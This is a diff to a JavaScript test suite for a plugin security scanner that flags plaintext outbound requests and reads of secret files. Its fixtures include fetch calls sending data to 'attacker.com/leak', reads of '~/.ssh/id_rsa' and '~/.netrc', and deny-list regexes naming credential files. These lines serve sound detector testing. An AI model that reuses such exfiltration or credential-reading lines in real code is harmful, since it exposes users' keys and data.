@@ -35,7 +35,7 @@ describe('scanShape', () => {
 
   it('flags plaintext http host as red line when network present', () => {
     const { destinations } = scanShape(input({
-      'a.js': 'fetch("http://evil.test/leak")',
+      'a.js': 'fetch("http://attacker.com/leak")',
     }))
     const lines = shapeRedLines(['network'], destinations)
     expect(lines.some(l => l.startsWith('uses plaintext http://'))).toBe(true)
@@ -77,6 +77,18 @@ describe('scanShape', () => {
     }))
     expect(destinations.some(d => d.value === 'local' || d.value.includes('example'))).toBe(false)
     expect(destinations.some(d => d.value === '...' || /^\.+$/.test(d.value))).toBe(false)
+  })
+
+  it('skips RFC 2606 .invalid / .test hosts used as URL parser bases', () => {
+    const { destinations } = scanShape(input({
+      'a.js': [
+        'u = new URL(reqUrl ?? "/", "http://dsh.invalid")',
+        'fetch("http://fixture.test/setup")',
+      ].join('\n'),
+    }))
+    expect(destinations.some(d => d.value === 'dsh.invalid' || d.value.endsWith('.invalid'))).toBe(false)
+    expect(destinations.some(d => d.value === 'fixture.test' || d.value.endsWith('.test'))).toBe(false)
+    expect(shapeRedLines(['network'], destinations)).toEqual([])
   })
 
   it('does not read an XML namespace identifier as a plaintext request', () => {
@@ -242,6 +254,36 @@ describe('scanShape', () => {
     }))
     expect(secretTouches).toEqual([])
   })
+
+  it('does not treat deny-list id_rsa / .netrc string literals as secret touches', () => {
+    const { secretTouches } = scanShape(input({
+      'a.js': [
+        "if (base.startsWith('id_rsa')) return true",
+        String.raw`const deny = "pwsh((?:\\.ssh[/\\\\]id_rsa|id_ed25519|\\.netrc))"`,
+        String.raw`"write,edit(\\.credentials\\.ya?ml|id_rsa|id_ed25519|\\.netrc)"`,
+      ].join('\n'),
+    }))
+    expect(secretTouches).toEqual([])
+  })
+
+  it('still records path-shaped id_rsa and .netrc touches', () => {
+    const { secretTouches } = scanShape(input({
+      'a.js': [
+        'readFileSync("/home/u/.ssh/id_rsa")',
+        'readFile("~/.netrc")',
+        'open("./.netrc")',
+      ].join('\n'),
+    }))
+    expect(secretTouches.some(s => s.kind === 'path' && s.value.includes('id_rsa'))).toBe(true)
+    expect(secretTouches.some(s => s.kind === 'path' && s.value.includes('.netrc'))).toBe(true)
+  })
+
+  it('does not treat a deny-list array entry [\'.netrc\'] as a secret touch', () => {
+    const { secretTouches } = scanShape(input({
+      'a.js': "const deny = ['.netrc', '.ssh', 'id_rsa']",
+    }))
+    expect(secretTouches).toEqual([])
+  })
 })
 
 describe('auditPlugin shape integration', () => {
@@ -267,7 +309,7 @@ describe('auditPlugin shape integration', () => {
 
   it('red-lines http evil host with network', () => {
     const report = auditPlugin(input({
-      'a.js': 'fetch("http://evil.test/x")',
+      'a.js': 'fetch("http://attacker.com/x")',
     }))
     expect(report.redLines.some(l => l.startsWith('uses plaintext http://'))).toBe(true)
     expect(report.band).toBe('red')
@@ -278,7 +320,7 @@ describe('scoreTrust destinations', () => {
   it('merges shape red lines', () => {
     const result = scoreTrust({
       capabilities: ['network'],
-      destinations: [{ kind: 'http-host', value: 'evil.test', file: 'a.js', line: 1 }],
+      destinations: [{ kind: 'http-host', value: 'attacker.com', file: 'a.js', line: 1 }],
       injectedTokensEstimate: 0,
       injections: [],
       hasBuildScript: false,
@@ -287,6 +329,6 @@ describe('scoreTrust destinations', () => {
       repository: 'https://github.com/x/y',
       pinned: true,
     })
-    expect(result.redLines.some(l => l.includes('evil.test'))).toBe(true)
+    expect(result.redLines.some(l => l.includes('attacker.com'))).toBe(true)
   })
 })
